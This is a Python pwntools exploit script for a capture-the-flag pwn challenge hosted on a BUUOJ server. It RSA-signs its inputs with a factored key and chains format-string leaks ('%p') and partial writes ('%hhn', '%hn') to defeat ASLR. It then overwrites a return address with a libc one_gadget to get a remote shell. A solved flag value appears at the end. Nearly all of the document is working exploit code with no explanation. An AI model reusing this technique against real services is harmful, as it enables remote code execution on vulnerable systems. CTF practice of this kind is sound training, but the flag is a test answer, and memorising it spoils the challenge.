#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *
from Crypto.Util.number import bytes_to_long, long_to_bytes
from gmpy2 import invert

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

filename = "./pwn"
p = remote('tcp.dasc.buuoj.cn', 28089)
# p = process(filename)
e = ELF(filename, checksec=False)
# l = ELF(e.libc.path, checksec=False)
l = ELF("./libc-2.27.so", checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	# lg("p.pid")
	# input()
	pass

n0 = 125929558285838122981938793459630773025162920525251356687688812999666759615921050359414338068063425479948010539252026365977707361962932013049637097311291763866352503104013778306176776110733239343100098577761198501786979178603002524323658920750922477495615561099575287665110734080670065963391590988989914994939
p0 = 16617127
q0 = 7578299081774973675168926220497127633745768478826174746554492422165802765780212810518589529228694315205511189705177457329278843566817056465274478392762585485827514172817826950842752547461016536920016232514874472692360067934908514830732106744500567245807025552586514363470336002166323093239378322678157
e0 = 65537
phi = (p0 - 1) * (q0 - 1)
d0 = int(invert(e0, phi))
def process_data(data):
	m = bytes_to_long(data)
	c = pow(m, d0, n0)
	return long_to_bytes(c)

def cmd():
	ru(b'> ')

def send(payload):
	sn(process_data(payload) + b'##')

def add(data, description=None, size=0):
	cmd()
	send(b'257\n' + data)
	ru(b'(y/n) ')
	if description == None:
		sn(b'n')
	else:
		sn(b'y')
		if size == 0: 
			size = len(description)
		ru(b'size: ')
		sn(str(size).encode())
		ru(b'content: ')
		sn(description)
def delete(id):
	cmd()
	send(b'258\n' + id)
def printf_info():
	cmd()
	send(b'261\n')

debugPID()
payload = b"%p-"*20
add(b'eXL'.ljust(8, b'\x00')+b'aaa'.ljust(8, b'\x00')+b'bbb'.ljust(8, b'\x00')+p32(1)+p32(2)+p32(3)+p32(0), payload)

printf_info()
ru(b';0x')
rsi = int(ru(b'-0x', "drop"), 16)
libc_base = int(ru(b'-', "drop"), 16) - l.symbols['printf']
ru(b'-', "drop")
ru(b'-', "drop")
ru(b'-', "drop")
ru(b'-', "drop")
leak = int(ru(b'-', "drop"), 16)
ru(b'-', "drop")
ru(b'-', "drop")
ru(b'-', "drop")
chunk_addr = int(ru(b'-', "drop"), 16)
stack_leak = int(ru(b'-', "drop"), 16)
elf_base = int(ru(b'-', "drop"), 16) - 0x435f

stack_target = stack_leak + 0x18
one_gadget = libc_base + 0x10a2fc
pop_ret = elf_base + 0x0000000000004473

lg("libc_base")
lg("chunk_addr")
lg("stack_leak")

debugPID()
count = (stack_target & 0xff)
payload = b'%' + i2b(count) + b'c%12$hhn'
add(b'ccc'.ljust(8, b'\x00')+b'ddd'.ljust(8, b'\x00')+b'eee'.ljust(8, b'\x00')+p32(4)+p32(13)+p32(8)+p32(1), payload)
printf_info()
delete(b'ccc')
# debugPID()

count = (one_gadget & 0xffff)
payload = b'%' + i2b(count) + b'c%16$hn'
add(b'ccc'.ljust(8, b'\x00')+b'ddd'.ljust(8, b'\x00')+b'eee'.ljust(8, b'\x00')+p32(4)+p32(13)+p32(8)+p32(1), payload)
printf_info()
delete(b'ccc')

stack_target = stack_leak + 0x18 + 2
count = (stack_target & 0xff)
payload = b'%' + i2b(count) + b'c%12$hhn'
add(b'ccc'.ljust(8, b'\x00')+b'ddd'.ljust(8, b'\x00')+b'eee'.ljust(8, b'\x00')+p32(4)+p32(13)+p32(8)+p32(1), payload)
printf_info()
delete(b'ccc')
# debugPID()

count = ((one_gadget & 0xff0000) >> 16)
payload = b'%' + i2b(count) + b'c%16$hhn'
add(b'ccc'.ljust(8, b'\x00')+b'ddd'.ljust(8, b'\x00')+b'eee'.ljust(8, b'\x00')+p32(4)+p32(13)+p32(8)+p32(1), payload)
printf_info()
delete(b'ccc')

stack_target = stack_leak + 0x8
count = (stack_target & 0xff)
payload = b'%' + i2b(count) + b'c%12$hhn'
add(b'ccc'.ljust(8, b'\x00')+b'ddd'.ljust(8, b'\x00')+b'eee'.ljust(8, b'\x00')+p32(4)+p32(13)+p32(8)+p32(1), payload)
printf_info()
delete(b'ccc')
# debugPID()

count = (pop_ret & 0xffff)
payload = b'%' + i2b(count) + b'c%16$hhn'
add(b'ccc'.ljust(8, b'\x00')+b'ddd'.ljust(8, b'\x00')+b'eee'.ljust(8, b'\x00')+p32(4)+p32(13)+p32(8)+p32(1), payload)
printf_info()
# delete(b'ccc')

debugPID()
p.interactive()

# b *$rebase(0x3CC9)


# flag{46683722620065108758777443658569}